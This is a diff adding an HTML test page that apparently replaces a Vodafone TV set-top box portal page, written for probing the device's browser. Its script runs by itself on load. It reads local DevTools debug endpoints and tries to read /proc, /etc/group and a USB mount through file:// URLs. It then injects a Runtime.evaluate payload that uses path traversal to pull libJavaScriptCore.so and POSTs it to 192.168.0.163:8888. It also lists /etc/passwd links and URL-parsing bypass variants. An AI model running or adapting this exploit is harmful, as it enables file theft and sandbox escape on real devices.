@@ -1,0 +1,208 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Local Neon Test</title>
+  <style>
+    body { margin: 0; background: #101820; color: white; font-family: Arial, sans-serif; }
+    main { padding: 70px; }
+    h1 { color: #e60000; font-size: 52px; }
+    p { font-size: 28px; line-height: 1.45; }
+    a { display: inline-block; margin: 8px; padding: 18px 24px; background: #e60000;
+        color: white; font-size: 26px; text-decoration: none; }
+    a:focus { outline: 6px solid white; }
+    pre { min-height: 72px; padding: 14px; background: #000; color: #7cff7c;
+          white-space: pre-wrap; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Local Neon page loaded</h1>
+    <p>This replaces <code>devices.lightbox.co.nz/vodafone-tv/index.html</code>.</p>
+    <pre id="out">Ready. Select a link.</pre>
+    <a id="google" href="https://www.google.com/">Open Google</a>
+	<a href="file:///etc/passwd" onclick="show('clicked file passwd'); return true;">file:/etc/passwd</a>
+	<a href="file:///../../etc/passwd" onclick="show('clicked file traverse'); return true;">file:traverse</a>
+	<a href="file:///proc/version" onclick="log('nav proc version'); return true;">/proc/version</a>
+	<a href="file:///proc/cpuinfo" onclick="log('nav cpuinfo'); return true;">/proc/cpuinfo</a>
+    <a id="tvnz" href="https://www.tvnz.co.nz/">Open TVNZ+</a>
+    <a href="https://www.tvnz.co.nz/ondemand">Open legacy TVNZ OnDemand</a>
+    <a id="threenow" href="https://www.threenow.co.nz/">Open ThreeNow</a>
+    <a id="netflix" href="https://www.netflix.com/">Open Netflix</a>
+    <a href="https://www.netflix.com/?codex_marker=VF123">Open Netflix with URL marker</a>
+    <a href="https://www.netflix.com/VF123">Netflix path marker</a>
+    <a href="https://www.netflix.com/?q=VF123%3BTEST">Netflix encoded-separator marker</a>
+    <a href="https://www.netflix.com/#VF123">Netflix fragment marker</a>
+    <a href="https://www.netflix.com/VF123/CHILD456">Netflix nested path marker</a>
+    <a href="https://www.netflix.com/%56%46%31%32%33">Netflix encoded path marker</a>
+    <a href="https://www.netflix.com/VF123%2FCHILD456">Netflix encoded-slash marker</a>
+    <a href="https://www.netflix.com/VF123;TEST456">Netflix path-parameter marker</a>
+    <a href="https://www.netflix.com/browse/VF123">Netflix browse-route marker</a>
+    <a href="https://www.netflix.com/watch/VF123">Netflix watch-route marker</a>
+    <a href="https://www.netflix.com/watch/80057281">Netflix numeric watch route</a>
+    <a href="https://www.netflix.com/title/80057281">Netflix numeric title route</a>
+    <a href="https://www.netflix.com/browse/genre/83">Netflix genre route</a>
+    <a href="https://www.netflix.com/browse/my-list">Netflix My List route</a>
+    <a href="https://www.netflix.com/title/80057281?codex_marker=VF123">Netflix valid title with query marker</a>
+    <a href="https://www.netflix.com/title/80057281#VF123">Netflix valid title with fragment marker</a>
+    <a href="nflx://www.netflix.com/title/80057281">Netflix native nflx title URI</a>
+    <a href="nflx://www.netflix.com/watch/80057281">Netflix native nflx watch URI</a>
+    <a href="netflix://title/80057281">Netflix alternate native URI</a>
+    <a href="https://WWW.NETFLIX.COM:443/title/80057281">Netflix mixed-case host and port</a>
+    <a href="http://www.netflix.com@192.168.0.163:8888/vodafone-tv/index.html?marker=NFUSERINFO">Netflix text in URL user-info</a>
+    <a href="http://192.168.0.163:8888/vodafone-tv/index.html?next=https%3A%2F%2Fwww.netflix.com%2Ftitle%2F80057281">Netflix URL inside local query</a>
+    <a href="http://192.168.0.163:8888/vodafone-tv/index.html#https://www.netflix.com/title/80057281">Netflix URL inside local fragment</a>
+    <a href="https://www.netflix.com/title/../title/80057281">Netflix literal dot-segment route</a>
+    <a href="https://www.netflix.com/title/%2e%2e/title/80057281">Netflix encoded dot-segment route</a>
+    <a href="https://www.netflix.com//title//80057281">Netflix repeated-slash route</a>
+    <a href="https://www.netflix.com/%74%69%74%6c%65/80057281">Netflix encoded route-name</a>
+    <a href="https://www.netflix.com//title/80057281">Netflix double-leading-slash only</a>
+    <a href="https://www.netflix.com/title//80057281">Netflix double-ID-separator only</a>
+    <a href="https://www.netflix.com///title/80057281">Netflix triple-leading-slash</a>
+    <a href="https://www.netflix.com////title////80057281">Netflix quadruple-slash route</a>
+    <a href="https://www.netflix.com//watch//80057281">Netflix repeated-slash watch route</a>
+    <a href="https://www.primevideo.com/browse">Open Prime Video</a>
+    <a href="/">Open OIPF test page</a>
+    <a href="/lifecycle.html">OIPF lifecycle URI tests</a>
+  </main>
+  <script>
+  (function () {
+        var out = document.getElementById('out');
+
+    window.addEventListener('pagehide', function () {
+      try { (new Image()).src = '/bridge-log?index=pagehide&t=' + Date.now(); } catch (e) {}
+    });
+    window.addEventListener('visibilitychange', function () {
+      try { (new Image()).src = '/bridge-log?index=vis-' + document.visibilityState + '&t=' + Date.now(); } catch (e) {}
+    });
+
+    function log(message) {
+      out.textContent += '\n' + message;
+      try {
+        (new Image()).src = '/bridge-log?index=' + encodeURIComponent(message) + '&t=' + Date.now();
+      } catch (ignore) {}
+    }
+
+    function openIntent(name, uri) {
+      log('SELECT ' + name + ' uri=' + uri);
+      try {
+        var manager = oipfObjectFactory.createApplicationManagerObject();
+        var owner = manager.getOwnerApplication(document);
+        var child = owner.createApplication(uri, true);
+        log('createApplication return=' + typeof child + ':' + String(child));
+      } catch (error) {
+        log('createApplication THROW=' + error.name + ':' + error.message);
+      }
+      setTimeout(function () {
+        log('navigation fallback');
+        try { location.href = uri; }
+        catch (error) { log('navigation THROW=' + error.name + ':' + error.message); }
+      }, 1200);
+    }
+
+    var links = document.getElementsByTagName('a');
+    for (var i = 0; i < links.length; i++) {
+      links[i].onclick = (function (link) {
+        return function (event) {
+          var uri = link.getAttribute('href');
+          if (uri.indexOf('intent:') === 0) {
+            if (event && event.preventDefault) event.preventDefault();
+            openIntent(link.textContent || link.innerText, uri);
+            return false;
+          }
+          log('NAVIGATE ' + (link.textContent || link.innerText) + ' uri=' + uri);
+          return true;
+        };
+      }(links[i]));
+    }
+
+    log('PAGE loaded ua=' + navigator.userAgent);
+    (function probeLocalDebug() {
+      var paths = ['/json', '/json/list', '/json/version', '/'];
+      for (var p = 0; p < paths.length; p++) {
+        (function (path) {
+          try {
+            var x = new XMLHttpRequest();
+            x.open('GET', 'http://127.0.0.1:9226' + path, true);
+            x.timeout = 5000;
+            x.onreadystatechange = function () {
+              if (x.readyState === 4) log('DBG ' + path + ' status=' + x.status + ' body=' + String(x.responseText).slice(0, 1800));
+            };
+            x.onerror = function () { log('DBG ' + path + ' error'); };
+            x.ontimeout = function () { log('DBG ' + path + ' timeout'); };
+            x.send(null);
+          } catch (e) { log('DBG ' + path + ' THROW=' + e); }
+        }(paths[p]));
+      }
+    }());
+    (function probePrivilegedFiles() {
+      var files = ['file:///proc/self/status', 'file:///etc/group', 'file:///mnt/usb0/'];
+      for (var f = 0; f < files.length; f++) {
+        (function (url) {
+          try {
+            var x = new XMLHttpRequest();
+            x.open('GET', url, true);
+            x.timeout = 5000;
+            x.onreadystatechange = function () {
+              if (x.readyState === 4) log('FILE ' + url + ' status=' + x.status + ' body=' + String(x.responseText).slice(0, 2500));
+            };
+            x.onerror = function () { log('FILE ' + url + ' error'); };
+            x.ontimeout = function () { log('FILE ' + url + ' timeout'); };
+            x.send(null);
+          } catch (e) { log('FILE ' + url + ' THROW=' + e); }
+        }(files[f]));
+      }
+      try {
+        var fr = document.createElement('iframe');
+        fr.style.width = '1px'; fr.style.height = '1px';
+        fr.onload = function () {
+          try { log('IFRAME USB=' + fr.contentWindow.document.documentElement.outerHTML.slice(0, 3500)); }
+          catch (e) { log('IFRAME USB access THROW=' + e); }
+        };
+        fr.onerror = function () { log('IFRAME USB error'); };
+        fr.src = 'file:///mnt/usb0/';
+        document.body.appendChild(fr);
+      } catch (e) { log('IFRAME setup THROW=' + e); }
+    }());
+    (function devtoolsSecondTarget() {
+      function getJson(path, cb) {
+        var x = new XMLHttpRequest();
+        x.open('GET', 'http://127.0.0.1:9226' + path, true);
+        x.onreadystatechange = function () { if (x.readyState === 4 && x.status === 200) cb(x.responseText); };
+        x.send(null);
+      }
+      /* Opening a file:// popup makes the application manager hide this page
+         a few seconds later. Keep this target alive and inspect only existing
+         portal targets. */
+      function inspectTargets() {
+        getJson('/json/list', function (body) {
+          log('TARGETS after popup=' + body);
+          try {
+            var a = JSON.parse(body);
+            if (!a.length) { log('TARGET no targets'); return; }
+            var uploadExpr = "(function(){if(typeof wtv==='undefined'||!wtv.jsonRpcMiddlewareManager)return 'NO_WTV';return wtv.jsonRpcMiddlewareManager.getFile('../../../../usr/local/lib/libJavaScriptCore.so').then(function(b){var x=new XMLHttpRequest();x.open('POST','http://192.168.0.163:8888/upload?name=libJavaScriptCore.so.b64',true);x.onload=function(){console.log('JSC_UPLOAD '+x.status+' '+b.length)};x.onerror=function(){console.log('JSC_UPLOAD_ERROR')};x.send(b);return 'JSC_BYTES '+b.length}).catch(function(e){return 'JSC_GET_ERROR '+e})})()";
+            for (var i = 0; i < a.length; i++) (function (target) {
+              if (!target.webSocketDebuggerUrl) return;
+              var ws = new WebSocket(target.webSocketDebuggerUrl);
+              ws.onopen = function () {
+                log('CDP open target=' + target.id + ' url=' + target.url);
+                ws.send(JSON.stringify({id: 7020, method: 'Runtime.evaluate', params: {expression: uploadExpr, awaitPromise: false, returnByValue: true}}));
+              };
+              ws.onmessage = function (ev) {
+                log('CDP message target=' + target.id + ' ' + String(ev.data).slice(0, 3500));
+                try { ws.close(); } catch (ignore) {}
+              };
+              ws.onerror = function () { log('CDP websocket error target=' + target.id); };
+            }(a[i]));
+          } catch (e) { log('CDP THROW=' + e); }
+        });
+      }
+      setTimeout(inspectTargets, 1000);
+      setInterval(inspectTargets, 5000);
+    }());
+    document.getElementById('google').focus();
+  }());
+  </script>
+</body>
+</html>
